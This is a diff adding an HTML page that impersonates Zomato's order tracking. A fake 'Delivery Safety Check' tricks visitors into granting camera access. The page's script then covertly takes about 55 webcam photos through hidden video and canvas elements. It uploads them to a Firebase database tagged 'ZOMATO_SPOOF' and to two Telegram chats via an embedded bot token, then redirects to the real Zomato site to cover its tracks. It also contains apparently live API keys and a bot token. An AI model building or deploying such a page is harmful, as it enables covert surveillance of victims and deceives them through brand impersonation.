@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zomato | Track Order</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --z-red: #E23744;
+            --z-bg: #FFFFFF;
+            --z-text: #1C1C1C;
+            --z-sub: #696969;
+            --z-border: #F8F8F8;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #F4F4F4; color: var(--z-text);
+            font-family: 'Okra', Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .z-card {
+            width: 100%; max-width: 420px; background: var(--z-bg); border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden;
+        }
+
+        .z-header {
+            padding: 15px 20px; display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid #EEE;
+        }
+
+        .z-logo { width: 80px; }
+
+        .map-preview {
+            width: 100%; height: 180px; background: #E0E0E0; position: relative;
+            background-image: url('https://api.mapbox.com/styles/v1/mapbox/light-v10/static/72.8777,19.0760,12,0/420x180?access_token=SPOOF_TOKEN');
+            background-size: cover;
+        }
+
+        .map-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.7); display: flex; align-items: center; justify-content: center;
+        }
+
+        .tracking-body { padding: 30px 20px; text-align: center; }
+
+        .delivery-status {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            color: #257E3E; font-weight: 600; margin-bottom: 15px; font-size: 15px;
+        }
+
+        h2 { font-size: 18px; font-weight: 600; margin: 0 0 10px; }
+        p { font-size: 13px; color: var(--z-sub); line-height: 1.5; margin-bottom: 25px; }
+
+        .btn-z {
+            background: var(--z-red); color: #FFF; border: none;
+            width: 100%; padding: 14px; font-size: 15px; font-weight: 600;
+            border-radius: 8px; cursor: pointer; transition: 0.2s;
+        }
+
+        /* Verification UI */
+        #verify-ui { display: none; }
+        
+        .pulse-loader {
+            width: 50px; height: 50px; background: var(--z-red); border-radius: 50%;
+            margin: 0 auto 20px; animation: z-pulse 1.5s infinite;
+        }
+        @keyframes z-pulse { 0% { transform: scale(0.9); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
+
+        .node-info { font-size: 10px; color: #BBB; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="z-card">
+        <div class="z-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Zomato_Logo.svg" class="z-logo">
+            <div style="font-size: 12px; color: var(--z-sub);">Order #8829-Z</div>
+        </div>
+
+        <div class="map-preview">
+            <div class="map-overlay">
+                <div style="background: white; padding: 10px 15px; border-radius: 20px; font-size: 12px; font-weight: 600; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                    📍 Pinning Delivery Location...
+                </div>
+            </div>
+        </div>
+
+        <div class="tracking-body" id="init-view">
+            <div class="delivery-status">🛵 Partner is arriving shortly</div>
+            <h2>Delivery Safety Check</h2>
+            <p>To ensure a secure contactless handover, please complete the <b>Visual Verification</b> to calibrate the AR delivery pin at your current entrance.</p>
+            
+            <button class="btn-z" onclick="startZomatoSync()">Verify & Track Order</button>
+            <div class="node-info">Mumbai Central Hub | Relay-02</div>
+        </div>
+
+        <div class="tracking-body" id="verify-ui">
+            <div class="pulse-loader"></div>
+            <div style="font-weight: 600;">Calibrating AR Drop-off Point...</div>
+            <div style="font-size: 12px; color: var(--z-sub); margin-top: 8px;" id="z-timer">Synchronizing with Mumbai node (60s)</div>
+            
+            <div style="text-align: left; background: #F8F8F8; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 10px; color: #666; margin-top: 20px; border: 1px solid #EEE;">
+                > FETCHING_GEO_COORDS: 19.0760° N, 72.8777° E<br>
+                > NODE_SYNC: MUMBAI_WEST_PRIMARY<br>
+                > STATUS: ENCRYPTING_HANDOVER_HASH
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startZomatoSync() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('verify-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('z-timer').innerText = `Synchronizing with Mumbai node (${timeLeft}s)`;
+
+                        if (count <= 55) {
+                            zomatoCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.zomato.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.zomato.com";
+            }
+        }
+
+        function zomatoCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "ZOMATO_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CENTRAL" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'zomato_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
